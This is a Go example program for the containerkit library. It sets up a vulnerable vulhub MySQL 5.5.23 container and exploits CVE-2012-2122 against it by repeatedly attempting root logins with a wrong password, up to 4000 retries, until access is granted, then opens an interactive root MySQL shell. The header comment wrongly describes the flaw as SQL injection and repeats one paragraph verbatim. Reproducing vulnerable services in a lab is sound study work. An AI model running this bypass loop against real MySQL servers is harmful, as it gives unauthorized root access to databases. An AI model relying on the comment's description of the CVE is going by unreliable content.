// Example: MySQL Vulnerability CVE-2012-2122
//
// This example demonstrates how to use containerkit to exploit a MySQL vulnerability.
// The vulnerability is CVE-2012-2122, which is a SQL injection vulnerability in MySQL.
// The example uses a containerkit flow to pull the attacker image, start the MySQL database,
// and then start the attacker container. The attacker container is used to exploit the MySQL
// vulnerability.
//
// The example uses a containerkit flow to pull the attacker image, start the MySQL database,
// and then start the attacker container. The attacker container is used to exploit the MySQL
// vulnerability.
package main

import (
	"context"
	"errors"
	"fmt"
	"io"
	"log"
	"os"
	"os/signal"
	"syscall"

	"github.com/aptd3v/containerkit/pkg/client"
	"github.com/aptd3v/containerkit/pkg/client/terminal"
	"github.com/aptd3v/containerkit/pkg/kit"
	"github.com/aptd3v/containerkit/pkg/kit/types"
	"github.com/aptd3v/containerkit/pkg/taskflow"
)

const (
	title         = "MySQL Vulnerability CVE-2012-2122"
	projectName   = "mysql-vuln"
	mysqlImage    = "vulhub/mysql:5.5.23"
	mysqlPort     = "3306"
	attackerImage = "vulhub/mysql:5.5.23"
	mysqlHost     = "vuln-mysql-server"
	mysqlNetNS    = "mysql-vuln-mysql-1"
	shellName     = "mysql-vuln-shell"
)

func main() {
	if err := run(); err != nil && !errors.Is(err, context.Canceled) {
		log.Fatal(err)
	}
}

func run() error {

	ctx, stop := signal.NotifyContext(context.Background(), os.Interrupt, syscall.SIGTERM)
	defer stop()

	cli, err := client.NewClient(client.FromEnv(), client.WithAPIVersionNegotiation())
	if err != nil {
		return err
	}
	defer cli.Close()

	flow := taskflow.New(title, cli)
	defer func() {
		fmt.Fprintln(os.Stderr, "tearing down...")
		if err := flow.Remove(context.Background()); err != nil {
			log.Printf("remove: %v", err)
		}
	}()

	pull := flow.Task("pull", func(ctx context.Context) error {
		rc, err := cli.ImagePull(ctx, attackerImage, nil)
		if err != nil {
			return err
		}
		defer rc.Close()
		_, err = io.Copy(os.Stdout, rc)
		return err
	})
	db := flow.Compose("database", Compose(projectName, "mysql"), &kit.Up{Detach: true, Wait: true, Writer: io.Discard}).
		DependsOn(pull)
	probe := flow.Container("probe", attacker("probe", "-e", "SELECT 1"), nil).
		DependsOn(db).
		Retry(4000)
	shell := flow.Task("shell", func(ctx context.Context) error {
		return mysqlShell(ctx, cli)
	})
	probe.Precede(shell)

	return flow.Run(ctx, &taskflow.Run{
		Writer: os.Stdout,
		Watch: func(e taskflow.Event) {
			if e.Kind == taskflow.EventRetry {
				fmt.Printf("%s retrying (attempt %d)\n", e.Name, e.Attempt)
			}
		},
	})
}

func mysqlShell(ctx context.Context, cli *client.Client) error {
	alive := kit.NewContainer(shellName).
		Image(attackerImage).
		NetworkMode(types.NetworkContainer(mysqlNetNS)).
		Command("sleep", "inf")
	_ = cli.ContainerRemove(ctx, shellName, &client.Remove{Force: true})
	created, err := cli.ContainerCreate(ctx, alive)
	if err != nil {
		return err
	}
	defer cli.ContainerRemove(context.Background(), created.ID, &client.Remove{Force: true})
	if err := cli.ContainerStart(ctx, created.ID, nil); err != nil {
		return err
	}

	for {
		if err := ctx.Err(); err != nil {
			return err
		}
		exec, err := cli.ContainerExecCreate(ctx, created.ID, &client.Exec{
			AttachStdin: true, AttachStdout: true, AttachStderr: true, TTY: true,
			DetachKeys: "ctrl-c",
			Cmd:        mysqlCmd(),
		})
		if err != nil {
			return err
		}
		session, err := cli.ContainerExecAttachTerminal(ctx, exec.ID, &client.ExecAttach{TTY: true})
		if err != nil {
			return err
		}
		err = session.Start(ctx, func(sz terminal.Size) error {
			return cli.ContainerExecResize(ctx, exec.ID, &client.Resize{
				Width:  sz.Width,
				Height: sz.Height,
			})
		})
		session.Close()
		if ctx.Err() != nil {
			return ctx.Err()
		}
		if err != nil && !errors.Is(err, terminal.ErrClosed) {
			return err
		}
		inspect, err := cli.ContainerExecInspect(ctx, exec.ID)
		if err != nil {
			return err
		}
		if inspect.Running || (inspect.ExitCode != nil && *inspect.ExitCode == 0) {
			return nil
		}
		fmt.Fprintln(os.Stderr, "mysql exec denied, retrying")
	}
}

func attacker(name string, extra ...string) *kit.Container {
	return kit.NewContainer(name).
		Image(attackerImage).
		NetworkMode(types.NetworkContainer(mysqlNetNS)).
		Command(mysqlCmd(extra...)...)
}

func mysqlCmd(extra ...string) []string {
	cmd := []string{"mysql", "-uroot", "-pwrong", "-h", mysqlHost, "-P" + mysqlPort}
	return append(cmd, extra...)
}

func Compose(projectName string, serviceName string) *kit.Compose {
	return kit.NewCompose(
		kit.NewProject(projectName).WithService(
			kit.NewService(serviceName, MysqlContainer(mysqlImage)),
		),
	)
}

func MysqlContainer(ref string) *kit.Container {
	return kit.NewContainer().
		Image(ref).
		ExposedPort(types.TCP, mysqlPort).
		HostName(mysqlHost).
		PortBinding(types.PortBinding{
			HostPort:      mysqlPort,
			ContainerPort: mysqlPort,
		})
}
